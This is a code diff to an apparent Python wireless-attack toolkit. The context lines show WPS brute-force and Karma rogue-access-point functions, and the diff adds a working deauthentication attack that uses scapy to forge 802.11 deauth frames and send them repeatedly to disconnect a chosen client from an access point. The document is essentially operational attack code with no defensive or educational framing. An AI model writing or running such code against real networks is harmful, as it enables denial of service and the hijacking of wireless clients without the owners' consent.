@@ -1,5 +1,6 @@
+from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
 import subprocess
-from scapy.all import *
+import time
 
 def perform_wps_bruteforce(target_mac, interface='wlan0'):
     command = f"reaver -i {interface} -b {target_mac} -vv"
@@ -50,3 +51,16 @@ def perform_karma_attack(interface='wlan0', ssid='FreeWiFi'):
             time.sleep(1)
     except KeyboardInterrupt:
         print("Karma attack stopped.")
+
+def perform_deauth_attack(target_mac, ap_mac, interface='wlan0', count=10):
+    print(f"Starting Deauth attack targeting {target_mac} from AP {ap_mac} on interface {interface}...")
+    
+    frame = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth(reason=7)
+    
+    try:
+        for _ in range(count):
+            sendp(frame, iface=interface, verbose=0)
+            print(f"Deauth packet sent to {target_mac}")
+            time.sleep(0.1)  # Delay between packets
+    except KeyboardInterrupt:
+        print("Deauth attack stopped.")
